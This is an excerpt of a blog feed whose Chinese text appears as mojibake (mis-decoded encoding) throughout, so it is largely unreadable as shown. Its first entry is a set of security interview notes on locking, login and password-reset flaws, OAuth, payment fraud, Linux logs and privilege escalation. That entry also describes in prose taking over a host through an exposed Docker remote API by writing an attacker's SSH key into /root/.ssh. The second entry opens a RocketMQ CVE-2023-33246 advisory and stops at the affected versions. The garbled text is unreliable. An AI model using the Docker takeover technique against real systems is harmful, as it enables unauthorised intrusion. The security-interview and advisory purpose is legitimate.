<p>ä¹è§‚é”åˆ™è®¤ä¸ºä¸€èˆ¬æƒ…å†µä¸‹æ•°æ®ä¸ä¼šå‘ç”Ÿå†²çªï¼Œåªæœ‰åœ¨æäº¤æ–°æ•°æ®çš„æ—¶å€™æ‰å¯¹æ•°æ®è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœå‘ç”Ÿå†²çªåˆ™è¿”å›é”™è¯¯è®©ç”¨æˆ·å†³å®šæ€ä¹ˆåšã€‚å®ç°ä¹è§‚é”çš„æ–¹æ³•æ˜¯åœ¨æ•°æ®è¡¨ä¸­å¢åŠ ä¸€ä¸ªversionå­—æ®µï¼Œæ¯å½“æ•°æ®æ›´æ–°çš„æ—¶å€™è¿™ä¸ªå­—æ®µæ‰§è¡ŒåŠ 1æ“ä½œã€‚è¿™æ ·å½“æ•°æ®æ›´æ”¹çš„æ—¶å€™ï¼Œå¦å¤–ä¸€ä¸ªäº‹åŠ¡è®¿é—®æ­¤æ¡æ•°æ®è¿›è¡Œæ›´æ”¹çš„è¯å°±ä¼šæ“ä½œå¤±è´¥ï¼Œä»è€Œé¿å…äº†å¹¶å‘æ“ä½œé”™è¯¯ã€‚</p>
<p>æ­»é”</p>
<p>æ˜¯æŒ‡ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå› äº‰å¤ºèµ„æºè€Œé€ æˆçš„ä¸€ç§äº’ç›¸ç­‰å¾…çš„ç°è±¡ï¼Œè‹¥æ— å¤–åŠ›ä½œç”¨ï¼Œå®ƒä»¬éƒ½å°†æ— æ³•æ¨è¿›ä¸‹å»ã€‚æ­¤æ—¶ç§°ç³»ç»Ÿå¤„äºæ­»é”çŠ¶æ€æˆ–ç³»ç»Ÿäº§ç”Ÿäº†æ­»é”ï¼Œè¿™äº›æ°¸è¿œåœ¨äº’ç›¸ç­‰å¾…çš„è¿›ç¨‹ç§°ä¸ºæ­»é”è¿›ç¨‹ã€‚ç”±äºèµ„æºå ç”¨æ˜¯äº’æ–¥çš„ï¼Œå½“æŸä¸ªè¿›ç¨‹æå‡ºç”³è¯·èµ„æºåï¼Œä½¿å¾—æœ‰å…³è¿›ç¨‹åœ¨æ— å¤–åŠ›ååŠ©ä¸‹ï¼Œæ°¸è¿œåˆ†é…ä¸åˆ°å¿…éœ€çš„èµ„æºè€Œæ— æ³•ç»§ç»­è¿è¡Œï¼Œè¿™å°±äº§ç”Ÿäº†ä¸€ç§ç‰¹æ®Šç°è±¡æ­»é”ã€‚ ä¸€ç§æƒ…å½¢ï¼Œæ­¤æ—¶æ‰§è¡Œç¨‹åºä¸­ä¸¤ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹å‘ç”Ÿæ°¸ä¹…å µå¡ï¼ˆç­‰å¾…ï¼‰ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½åœ¨ç­‰å¾…è¢«å…¶ä»–çº¿ç¨‹å ç”¨å¹¶å µå¡äº†çš„èµ„æºã€‚ä¾‹å¦‚ï¼Œå¦‚æœçº¿ç¨‹Aé”ä½äº†è®°å½•1å¹¶ç­‰å¾…è®°å½•2ï¼Œè€Œçº¿ç¨‹Bé”ä½äº†è®°å½•2å¹¶ç­‰å¾…è®°å½•1ï¼Œè¿™æ ·ä¸¤ä¸ªçº¿ç¨‹å°±å‘ç”Ÿäº†æ­»é”ç°è±¡ã€‚è®¡ç®—æœºç³»ç»Ÿä¸­,å¦‚æœç³»ç»Ÿçš„èµ„æºåˆ†é…ç­–ç•¥ä¸å½“ï¼Œæ›´å¸¸è§çš„å¯èƒ½æ˜¯ç¨‹åºå‘˜å†™çš„ç¨‹åºæœ‰é”™è¯¯ç­‰ï¼Œåˆ™ä¼šå¯¼è‡´è¿›ç¨‹å› ç«äº‰èµ„æºä¸å½“è€Œäº§ç”Ÿæ­»é”çš„ç°è±¡ã€‚é”æœ‰å¤šç§å®ç°æ–¹å¼ï¼Œæ¯”å¦‚æ„å‘é”ï¼Œå…±äº«ï¼æ’ä»–é”ï¼Œé”è¡¨ï¼Œæ ‘å½¢åè®®ï¼Œæ—¶é—´æˆ³åè®®ç­‰ç­‰ã€‚é”è¿˜æœ‰å¤šç§ç²’åº¦ï¼Œæ¯”å¦‚å¯ä»¥åœ¨è¡¨ä¸ŠåŠ é”ï¼Œä¹Ÿå¯ä»¥åœ¨è®°å½•ä¸ŠåŠ é”</p>
<p>æ´»é”</p>
<p>æ´»é”æŒ‡çš„æ˜¯ä»»åŠ¡æˆ–è€…æ‰§è¡Œè€…æ²¡æœ‰è¢«é˜»å¡ï¼Œç”±äºæŸäº›æ¡ä»¶æ²¡æœ‰æ»¡è¶³ï¼Œå¯¼è‡´ä¸€ç›´é‡å¤å°è¯•ï¼Œå¤±è´¥ï¼Œå°è¯•ï¼Œå¤±è´¥ã€‚</p>
<blockquote>
<p>ç™»å½•è¿‡ç¨‹ä¸­ä¼šé‡åˆ°ä»€ä¹ˆå®‰å…¨é—®é¢˜</p>
</blockquote>
<p>å¯†ç çˆ†ç ´ã€ç”¨æˆ·åæšä¸¾ã€éªŒè¯ç å¤±æ•ˆã€å¼±å¯†ç ã€æ‰‹æœºå·è½°ç‚¸ã€ä¸‡èƒ½å¯†ç ã€èº«ä»½ä¼ªé€ </p>
<blockquote>
<p>é’ˆå¯¹çŸ­ä¿¡çš„å®‰å…¨ç­–ç•¥æœ‰å“ªå†™</p>
</blockquote>
<p>é™åˆ¶å•ä¸€è®¾å¤‡ã€å•ä¸€ipã€å•ä¸€æ‰‹æœºå·å‘é€è¯·æ±‚çš„æ¬¡æ•°</p>
<p>å»ºç«‹ä¸Šè¿°æ¸…å•çš„é»‘åå•</p>
<p>é‡‡ç”¨å›¾å½¢éªŒè¯ç </p>
<p>æ£€æµ‹ipæ‰€åœ¨åœ°ä¸æ”¶é›†å·å½’å±æ˜¯å¦åŒ¹é…â€”â€”-å¾®ä¿¡è´¦å·æ‰¾å›</p>
<p>è¾“å…¥æ‰‹æœºå·å®åè®¤è¯</p>
<p>æ£€æµ‹æ‰‹æœºå·æœ‰æ•ˆæ€§</p>
<p>wafæ‹¦æˆª</p>
<p>optionsè¯·æ±‚ï¼Œé¢„å‘é€è¯·æ±‚ä»åç«¯è·å–ä»¤ç‰Œã€‚å‘é€çŸ­ä¿¡é¡µé¢è½½å…¥çš„æ—¶å€™ï¼Œå‘åç«¯è¯·æ±‚ä»¤ç‰Œã€‚å‘é€çŸ­ä¿¡æ—¶å°†ä»¤ç‰Œå‘å›æœåŠ¡ç«¯å¯¹æ¯”ã€‚è¦ç¡®ä¿ä»¤ç‰Œä¸èƒ½è¢«è·å–ã€‚æ•…éœ€è¦å¯¹jsè¿›è¡Œæ··æ·†ã€‚</p>
<blockquote>
<p>æ³¨å†Œè¿‡ç¨‹ä¸­ä¼šé‡åˆ°å“ªå†™å®‰å…¨é—®é¢˜</p>
</blockquote>
<p>æ¶æ„æ³¨å†Œ</p>
<p>é‡å¤æ³¨å†Œ</p>
<p>è¦†ç›–æ³¨å†Œ</p>
<blockquote>
<p>æ‰¾å›å¯†ç è¿‡ç¨‹ä¸­ä¼šé‡åˆ°ä»€ä¹ˆå®‰å…¨é—®é¢˜ï¼Œè·¨æ­¥éª¤æ‰¾å›ï¼Œäº¤å‰sessionæ‰¾å›</p>
</blockquote>
<p>èº«ä»½å†’ç”¨ï¼Œç”¨è‡ªå·±çš„æ‰‹æœºæ¥å—éªŒè¯ç ï¼ŒéªŒè¯ç å‘å‡ºåï¼Œå¡«å†™ä»–äººçš„è´¦å·ï¼Œä¿®æ”¹äº†ä»–äººçš„å¯†ç ã€‚å³</p>
<p>é‚®ç®±å¼±tokenï¼šæ‰¾å›å¯†ç é“¾æ¥tokenè¢«çŒœè§£åˆ°</p>
<p>è¿”å›å‡­è¯ï¼šç”¨æˆ·å‡­è¯è¢«åŒ…å«åœ¨å“åº”æ•°æ®åŒ…ä¸­ï¼Œä»è€Œå¯ä»¥ç›´æ¥æºå¸¦è¿™ä¸ªå‡­è¯ç™»å½•ï¼Œç»•è¿‡äº†éªŒè¯é€»è¾‘</p>
<p>ç”¨æˆ·å‡­è¯æš´åŠ›ç ´è§£ï¼šå‡­è¯ç®€å•ï¼Œæ²¡æœ‰å¯¹å°è¯•æ¬¡æ•°åšé™åˆ¶ï¼Œæˆ–è€…åå°éªŒè¯é€»è¾‘è¢«çŒœè§£å‡ºæ¥ï¼Œä»è€Œç»•è¿‡æ¬¡æ•°é™åˆ¶</p>
<p>ç”¨æˆ·å‡­è¯æœ‰æ•ˆæ€§</p>
<p>éªŒè¯ç çš„æœ‰æ•ˆæ€§ï¼Œå´æ²¡æœ‰å¯¹éªŒè¯ç å’Œæ‰‹æœºå·ç åšç»‘å®šéªŒè¯</p>
<p>å®‰å…¨æ‰‹æœºé‡æ–°ç»‘å®š</p>
<p>å‡­è¯æœ‰æ•ˆæ€§</p>
<p>æœåŠ¡å™¨æ˜¯å¦å¼€å¯äº†éªŒè¯</p>
<p>è·¨æ­¥éª¤æ‰¾å›</p>
<p>æ³¨å…¥</p>
<p>tokenç”Ÿæˆå¯æ§</p>
<p>sessionè¦†ç›–</p>
<blockquote>
<p>OAuth 2.0æˆæƒç æ¨¡å¼çš„è®¤è¯è¿‡ç¨‹</p>
</blockquote>
<p>è¯¥è®¤è¯çš„ç›®çš„æ˜¯æ˜¯å¦å…è®¸ç¬¬ä¸‰æ–¹çš„åº”ç”¨ä»£è¡¨ç”¨æˆ·è·å¾—è®¿é—®æƒé™ã€‚</p>
<p>OAuth2.0æ˜¯ä¸€ç§å…è®¸ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºä½¿ç”¨èµ„æºæ‰€æœ‰è€…çš„å‡­æ®è·å¾—å¯¹èµ„æºæœ‰é™è®¿é—®æƒé™çš„ä¸€ç§æˆæƒåè®®</p>
<p>oauth2.0æœ‰å››ç§è®¤è¯æ–¹å¼ï¼Œæˆæƒç è®¤è¯ ç®€åŒ–æ¨¡å¼è®¤è¯ å¯†ç æ¨¡å¼è®¤è¯ å®¢æˆ·ç«¯æ¨¡å¼è®¤è¯ã€‚</p>
<p>æˆæƒç è®¤è¯è¿‡ç¨‹</p>
<p>å®¢æˆ·ç«¯ç‚¹å‡»è¯·æ±‚è®¤è¯æŒ‰é’®è¡¨ç¤ºå¼€å§‹è®¤è¯ï¼Œæµè§ˆå™¨å¼¹å‡ºè®¤è¯çª—å£ï¼Œç”¨æˆ·ç‚¹å‡»å…è®¸ï¼Œè®¤è¯æœåŠ¡å™¨ç”Ÿæˆæˆæƒç ï¼Œå¹¶é‡å®šå‘åˆ°æˆ‘ä»¬çš„çª—å£ã€‚å¼€å§‹åŒæ­¥èµ„æº</p>
<p><img src="/archives/b7f3ad9b/Untitled.png"></p>
<ul>
<li>æ³¨å†Œappï¼Œéœ€è¦è¿›è¡Œauthè®¤è¯çš„ç½‘ç«™éœ€è¦å…ˆåˆ°ç›®æ ‡ç½‘ç«™æ³¨å†Œï¼Œæ³¨å†ŒæˆåŠŸåæ–¹å¯è¿›è¡Œoauthè®¤è¯</li>
<li>ç”¨æˆ·å‘æµè§ˆå™¨å‘èµ·è®¿é—®è¯·æ±‚ï¼Œæµè§ˆå™¨è¯¢é—®æ˜¯å¦è¿æ¥åˆ°authæœåŠ¡å™¨ï¼Œç”¨æˆ·ç‚¹å‡»æ˜¯ï¼Œè¿›å…¥åˆ°è®¤è¯è¿‡ç¨‹</li>
<li>æµè§ˆå™¨ä»£æ›¿ç”¨æˆ·å‘è®¤è¯æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œæºå¸¦æ³¨å†Œappæ—¶è®¤è¯æœåŠ¡å™¨ç”Ÿæˆçš„å®¢æˆ·ç«¯idä¸é‡å®šå‘urlï¼Œè®¤è¯æœåŠ¡å™¨è¯¢é—®å®¢æˆ·ç¡®è®¤æ¶ˆæ¯ï¼Œæ˜¯å¦ç¡®è®¤è®©è¯¥ç‹ç« è®¿é—®ã€‚ç”¨æˆ·ç‚¹å‡»æ˜¯ï¼Œå®Œæˆè®¤è¯ã€‚</li>
<li>è®¤è¯æœåŠ¡å™¨é‡å®šå‘åˆ°ä¸Šé¢æäº¤çš„é‡å®šå‘urlï¼Œå¹¶å‘è¯·æ±‚è®¤è¯çš„æœåŠ¡å™¨è¿”å›ä¸€ä¸ªè®¤è¯ç ï¼Œauth-codeã€‚</li>
<li>è¯·æ±‚è®¤è¯çš„æœåŠ¡å™¨æºå¸¦è®¤è¯ç ã€å®¢æˆ·ç«¯ipã€å®¢æˆ·ç«¯å¯†ç è®¿é—®token endpointæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨è¿”å›ä¸€ä¸ªaccess_tokenç»™è¯·æ±‚è®¤è¯çš„æœåŠ¡å™¨ã€‚</li>
<li>è¯·æ±‚æœåŠ¡å™¨æºå¸¦access_tokenè®¿é—®æœåŠ¡å™¨èµ„æºã€‚è¯¥æœåŠ¡å™¨æ”¶åˆ°access_tokenåå‘è®¤è¯æœåŠ¡å™¨éªŒè¯è¯¥access_tokenï¼Œè®¤è¯æœåŠ¡å™¨è¿”å›ç”¨æˆ·ååŠæƒé™ç­‰ã€‚èµ„æºæœåŠ¡å™¨å‘è¯·æ±‚è®¤è¯çš„æœåŠ¡å™¨æä¾›èµ„æºï¼Œè¯¥æœåŠ¡å™¨å†å‘é€ç»™ç”¨æˆ·ã€‚</li>
<li>åœ¨æˆæƒç æ–¹å¼ä¸‹ï¼ŒACCESS_TOKEN åªä¼šå­˜åœ¨æˆ‘ä»¬ç½‘ç«™çš„æœåŠ¡å™¨é‡Œï¼Œç”¨æˆ·ç«¯ä»å§‹è‡³ç»ˆéƒ½è·å–ä¸åˆ°è¿™ä¸ªä¿¡æ¯ï¼Œæˆ‘ä»¬ä¸å¿…å®³æ€•ç”¨æˆ·çš„ç”µè„‘ä¸­æ¯’äº†è€Œå¯¼è‡´ ACCESS_TOKEN æ³„éœ²ã€‚</li>
</ul>
<p>ç®€åŒ–è®¤è¯â€”-ä¸ä½¿ç”¨clietn_secretï¼Œä¸é€‚ç”¨è®¤è¯ç è¿›è¡Œä¸­è½¬ï¼Œè®¿é—®tokenä¿å­˜åœ¨å®¢æˆ·ç«¯ã€‚</p>
<p><img src="/Untitled%201.png"></p>
<ul>
<li>æ³¨å†Œ</li>
<li>æµè§ˆå™¨å‘ŠçŸ¥æœåŠ¡å™¨è¦è¿æ¥åˆ°è®¤è¯æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è¯¢é—®æ˜¯å¦è¿æ¥ï¼Œç”¨æˆ·ç‚¹å‡»æ˜¯ã€‚</li>
<li>æµè§ˆå™¨å‘è®¤è¯æœåŠ¡å™¨å‘èµ·è®¤è¯è¯·æ±‚ï¼Œæºå¸¦å®¢æˆ·ç«¯idä»¥åŠé‡å®šå‘urlã€‚è®¤çœŸæœåŠ¡å™¨å‘èµ·è¯¢é—®ï¼Œæ˜¯å¦å…è®¸è¯·æ±‚å¤«åŒºå…¶è®¿é—®ã€‚</li>
<li>å®¢æˆ·ç«¯ç¡®è®¤åï¼Œè®¤è¯èŠ‚ç‚¹å°†è®¿é—®tokenè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li>
<li>å®¢æˆ·ç«¯æºå¸¦access_tokenè®¿é—®èµ„æºæœåŠ¡å™¨ï¼Œèµ„æºæœåŠ¡å™¨å‘è®¤è¯èŠ‚ç‚¹ç¡®è®¤access_tokenï¼Œè¿”å›ç”¨æˆ·åï¼Œæƒé™ç­‰ä¿¡æ¯ã€‚èµ„æºæœåŠ¡å™¨è¿”å›èµ„æºåˆ°å®¢æˆ·ç«¯ã€‚</li>
</ul>
<blockquote>
<p>OAuthä¼šæœ‰ä»€ä¹ˆå®‰å…¨é—®é¢˜?tokenå¤–å¸¦ã€csrfã€urlè·³è½¬</p>
</blockquote>
<p>redirect_urlç¯¡æ”¹</p>
<p>å¦‚æœstateå‚æ•°æ¥é™æ€ï¼Œæˆ–è€…ä¸å­˜åœ¨åˆ™å¯èƒ½å­˜åœ¨csrf</p>
<blockquote>
<p>æ”¯ä»˜è¿‡ç¨‹ä¸­ä¼šæœ‰ä»€ä¹ˆå®‰å…¨é—®é¢˜ï¼Ÿé‡‘é¢ç¯¡æ”¹ã€è´­ç‰©è½¦ç¯¡æ”¹ã€ä¼˜æƒ åˆ¸é‡ç”¨</p>
</blockquote>
<blockquote>
<p>è‹¹æœåè´¦</p>
</blockquote>
<p>receipt-dataè¢«é‡å¤ä½¿ç”¨ã€‚å®¢æˆ·åœ¨è‹¹æœå•†åº—è´­ä¹°äº§å“åï¼Œè‹¹æœå…¬å¸æ‰£æ¬¾æˆåŠŸåä¼šå‘å›ä¸€ä¸ªreceipt-dataï¼Œæ­£å¸¸çš„æµç¨‹åº”è¯¥åœ¨æœåŠ¡ç«¯éªŒè¯è¿™ä¸ªreceipt-dataçš„æœ‰æ•ˆæ€§ä¸å”¯ä¸€æ€§ï¼Œä½†æœ‰äº›å•†å®¶ä¸ºäº†å·æ‡’ï¼Œåœ¨å®¢æˆ·ç«¯åªéªŒè¯äº†å™¨æœ‰æ•ˆæ€§ï¼Œå¹¶æ²¡æœ‰éªŒè¯å…¶å”¯ä¸€æ€§ï¼Œå¯¼è‡´äº†é‡å¤åˆ·å•çš„é—®é¢˜ã€‚è¿™éƒ¨åˆ†å¤šå‡ºæ¥çš„æµæ°´ï¼Œè‹¹æœå…¬å¸æ˜¯ä¸ä¼šåˆ†è´¦çš„ã€‚</p>
<p>è¿˜æœ‰ä¿¡ç”¨å¡é»‘å¡åˆ·å•ã€å¤–å¸å¡æŠ˜æ‰£èµšå·®ä»·ã€è‹¹æœå¯¹å°é¢æ¶ˆè´¹ä¸åšéªŒè¯è¿‡ç¨‹çš„36æŠ€æœ¯ã€‚</p>
<blockquote>
<p>æè¿°ç¬¬ä¸‰æ–¹æ”¯ä»˜æµç¨‹</p>
</blockquote>
<p>ä¸‰æ–¹æ”¯ä»˜è¦ç»è¿‡äº§å“å±‚ã€æ ¸å¿ƒå±‚ã€ç½‘å…³å±‚ã€æœ€ååˆ°è¾¾æ¸ é“æµ‹</p>
<p>ç½‘å…³å±‚ä¸»è¦æ˜¯å°è£…å„ä¸ªæ¸ é“çš„å·®å¼‚ï¼Œå‘ˆç°ç»Ÿä¸€çš„æ¥å£ï¼Œç„¶åæä¾›ç»™ä¸Šå±‚ç³»ç»Ÿè°ƒç”¨ã€‚åŒæ—¶è·¯ç”±ä¸€èˆ¬ä¹Ÿç»´æŠ¤åœ¨ç½‘å…³å±‚ï¼Œè·¯ç”±ä¸€èˆ¬åˆ†ä¸ºäººå·¥è·¯ç”±ä¸è§„åˆ™è·¯ç”±ã€‚èŒå·¥è·¯ç”±æŒ‡è¿è¥äººå‘˜æŒ‡å®šæ”¯ä»˜æ¸ é“ä¸äº§å“ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œè§„åˆ™è·¯ç”±åˆ™æ˜¯æŒ‰ç…§ä¸šåŠ¡è¦æ±‚è®¾ç½®å„ç§è·¯ç”±è§„åˆ™ã€‚</p>
<p>æ ¸å¿ƒå±‚ï¼šä¸€èˆ¬åŒ…æ‹¬ä¼šå‘˜ç³»ç»Ÿã€é£æ§ç³»ç»Ÿã€æ”¶è´¹ç³»ç»Ÿã€è®¢å•ç³»ç»Ÿã€æ¸…ç®—ç³»ç»Ÿã€è´¢åŠ¡ç³»ç»Ÿã€ç­¾çº¦ç³»ç»Ÿç­‰</p>
<p>äº§å“å±‚ï¼šé€šè¿‡æ ¸å¿ƒå±‚æä¾›çš„æœåŠ¡ç»„åˆèµ·æ¥ï¼Œç­”é¢˜å¯åˆ†å…¥é‡‘ç±»äº§å“ï¼Œå‡ºé‡‘ç±»äº§å“</p>
<p>è¿è¥ç›´æ’‘å±‚ï¼šç›´æ’‘ç³»ç»Ÿæ˜¯ä¸€ä¸ªå…¬å¸æä¾›ç»™æ”¯ä»˜ç³»ç»Ÿè¿è¡Œçš„åŸºç¡€è®¾æ–½ï¼ŒåŒ…æ‹¬ä»¥ä¸‹å­ç³»ç»Ÿï¼šè¿ç»´ç›‘æ§ã€æ—¥å¿—åˆ†æã€çŸ­ä¿¡å¹³å°ã€å®‰å…¨æœºåˆ¶ã€ç»Ÿè®¡æŠ¥è¡¨</p>
<p><img src="/Untitled%202.png"></p>
<blockquote>
<p>suidä»€ä¹ˆæ„æ€ï¼Œè¢«è®¾ç½®ä¸ºsuidæ ‡å¿—ä½çš„ç¨‹åºå°±èƒ½ä»¥rootèº«ä»½æ‰§è¡Œäº†å—</p>
</blockquote>
<p>set user id     ä¸èƒ½ ï¼Œè®¾ç½®äº†suidçš„æ–‡ä»¶åªæ˜¯è®©å…¶ä»–ç”¨æˆ·è·å–äº†è¦æ“ä½œæ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™</p>
<blockquote>
<p>å¦‚ä½•æŸ¥çœ‹å½“å‰ä¸»æœºip å¼€æ”¾ç«¯å£ è¿›ç¨‹åˆ—è¡¨</p>
</blockquote>
<p>linux: ifconfig ip a ss netstat ps</p>
<p>windows: ipconfig  netstat tasklist</p>
<blockquote>
<p>å¦‚ä½•æŸ¥çœ‹ä¸€ä¸ªè¿›ç¨‹æ‰“å¼€&#x2F;è¯»å†™çš„æ–‡ä»¶</p>
</blockquote>
<p>lsof -p pid</p>
<blockquote>
<p>ç³»ç»Ÿç–‘ä¼¼è¢«å…¥ä¾µï¼Œéœ€è¦æ£€æŸ¥å“ªå†™æ—¥å¿—</p>
</blockquote>
<p>&#x2F;var&#x2F;log&#x2F;secure    ç™»å½•æ—¥å¿—ï¼Œå‡¡æ˜¯ä¸ç³»ç»Ÿæœ‰å…³çš„ç™»å½•ä¿¡æ¯éƒ½åœ¨è¿™é‡Œ</p>
<p>&#x2F;cat &#x2F;etc&#x2F;passwd æ£€æŸ¥æ˜¯å¦ç”±å¼‚å¸¸çš„ç”¨æˆ·</p>
<p>&#x2F;var&#x2F;log&#x2F;cron è®¡åˆ’ä»»åŠ¡</p>
<p>&#x2F;var&#x2F;log&#x2F;btmp é”™è¯¯ç™»å½•æ—¥å¿—</p>
<p>&#x2F;var&#x2F;log&#x2F;wtmp æ‰€æœ‰çš„ç™»å½•ç”¨æˆ·ä¿¡æ¯</p>
<p>&#x2F;var&#x2F;log&#x2F;utmp å½“å‰ç™»å½•ç”¨æˆ·ä¿¡æ¯</p>
<blockquote>
<p>ä»€ä¹ˆå«æ­£å‘è¿æ¥ã€ä»€ä¹ˆå«åå‘è¿æ¥ã€ä¸»æœºä¸èƒ½è®¿é—®å…¬ç½‘æ€ä¹ˆåŠ</p>
</blockquote>
<blockquote>
<p>CDNåŸŸåï¼Œå¦‚ä½•è·å–çœŸå®IP</p>
</blockquote>
<p>å­ç«™çŒœè§£ å¦‚æœå­ç«™ä¸ä¸»ç«™åœ¨åŒä¸€ä¸ªCæ®µï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè·å–å­ç«™çš„ipï¼Œç„¶åå†æšä¸¾ä¸»ç«™ã€‚</p>
<p>è®©ç½‘ç«™ä¸»åŠ¨è¿æ¥æˆ‘ä»¬ï¼Œ</p>
<p>æŸ¥æ‰¾å†å²dnsè§£æè®°å½•ï¼Œä¹Ÿå°±æ˜¯ï¼Œä½¿ç”¨cdnå‰çš„è®°å½•</p>
<p>ç½‘ç»œç©ºé—´æœç´¢</p>
<p>åˆ©ç”¨å…¶ä»–æ¼æ´</p>
<p>å¤šåœ°ping</p>
<blockquote>
<p>dockeræœªæˆæƒè®¿é—®</p>
</blockquote>
<p>docker remote api å†docker swarmå¼€å¯äº†2375ç«¯å£ç›‘å¬å®¹å™¨çŠ¶æ€çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨è¿™ä¸ªapiï¼Œå¦‚æœå…¶æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨dockerå®¢æˆ·ç«¯ç›´æ¥è¿æ¥å®ƒï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤getshellï¼Œæœ€å¸¸è§çš„åˆ©ç”¨å°±æ˜¯æ–°å»ºä¸€ä¸ªå®¹å™¨ï¼Œå°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½è¯¥å®¹å™¨ä¸­çš„æŸä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶åå‘å®¿ä¸»æœºçš„&#x2F;root&#x2F;.sshä¸­å†™å…¥æ”»å‡»æœºçš„å…¬é’¥å®ç°å…å¯†ç™»å½•ã€‚</p>
<blockquote>
<p>dockeré‡Œçš„ç‰¹æƒæ¨¡å¼æŒ‡ä»€ä¹ˆ</p>
</blockquote>
<p>ç‰¹æƒæ¨¡å¼åœ¨6.0ç‰ˆæœ¬çš„æ—¶å€™è¢«å¼•å…¥Dockerï¼Œå…¶æ ¸å¿ƒä½œç”¨æ˜¯å…è®¸å®¹å™¨å†…çš„rootæ‹¥æœ‰å¤–éƒ¨ç‰©ç†æœºçš„rootæƒé™ï¼Œè€Œæ­¤å‰åœ¨å®¹å™¨å†…çš„rootç”¨æˆ·åªæœ‰å¤–éƒ¨ç‰©ç†æœºæ™®é€šç”¨æˆ·çš„æƒé™     docker run â€“privileged</p>
<blockquote>
<p>è·å¾—äº†ä¸€ä¸ªä½æƒé™çš„shell,å¦‚ä½•ææƒï¼Œæœ‰ä»€ä¹ˆå¸¸ç”¨å·¥å…·å—</p>
</blockquote>
<p>å†…æ ¸ææƒ</p>
<p>sudoææƒ</p>
<p>suidææƒ</p>
<p>linuxé…ç½®é”™è¯¯ææƒ</p>
<p>å®šæ—¶ä»»åŠ¡ææƒ</p>
<p>å¯†ç å¤ç”¨ææƒ</p>
<p>ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ</p>
<blockquote>
<p>å½“å‘ç°ä¸€ä¸ªwebshellï¼Œå¦‚ä½•å¿«é€Ÿæ’æŸ¥</p>
</blockquote>
<blockquote>
<p>é‡åˆ°è¯·æ±‚åŠ å¯†æ€ä¹ˆåŠ</p>
</blockquote>
<blockquote>
<p>åŠ å¯†ç®—æ³•åœ¨soé‡Œæ€ä¹ˆåŠï¼Œæ··æ·†äº†æ— æ³•è‡ªå·±å®ç°æ€ä¹ˆåŠ</p>
</blockquote>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>é¢è¯•é¢˜</category>
      </categories>
      <tags>
        <tag>é¢è¯•é¢˜</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache RocketMQ è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2023-33246ï¼‰</title>
    <url>/archives/3553c506.html</url>
    <content><![CDATA[<h1 id="CVE-2023-33246"><a href="#CVE-2023-33246" class="headerlink" title="CVE-2023-33246"></a>CVE-2023-33246</h1><h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p>RocketMQæ˜¯é˜¿é‡Œå·´å·´åœ¨2012å¹´å¼€å‘çš„åˆ†å¸ƒå¼æ¶ˆæ¯ä¸­é—´ä»¶ï¼ŒåæçŒ®ç»™Apacheè½¯ä»¶åŸºé‡‘ä¼šå¹¶æˆä¸ºApacheçš„é¡¶çº§é¡¹ç›®ã€‚RocketMQä¸“ä¸ºä¸‡äº¿çº§è¶…å¤§è§„æ¨¡çš„æ¶ˆæ¯å¤„ç†è€Œè®¾è®¡ï¼Œå…·æœ‰é«˜ååé‡ã€ä½å»¶è¿Ÿã€æµ·é‡å †ç§¯ã€é¡ºåºæ”¶å‘ç­‰ç‰¹ç‚¹ã€‚</p>
<h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>RocketMQ 5.1.0åŠä»¥ä¸‹ç‰ˆæœ¬ï¼Œåœ¨ä¸€å®šæ¡ä»¶ä¸‹ï¼Œå­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œé£é™©ã€‚æ¼æ´æºäºRocketMQçš„NameServerã€Brokerã€Controllerç­‰å¤šä¸ªç»„ä»¶æš´éœ²åœ¨å…¬ç½‘ä¸­ä¸”ç¼ºä¹æƒé™æ ¡éªŒã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åˆ©ç”¨æ›´æ–°é…ç½®åŠŸèƒ½ä»¥RocketMQè¿è¡Œçš„ç³»ç»Ÿç”¨æˆ·èº«ä»½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<span id="more"></span>

<h2 id="å—å½±å“ç‰ˆæœ¬"><a href="#å—å½±å“ç‰ˆæœ¬" class="headerlink" title="å—å½±å“ç‰ˆæœ¬"></a>å—å½±å“ç‰ˆæœ¬</h2><p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
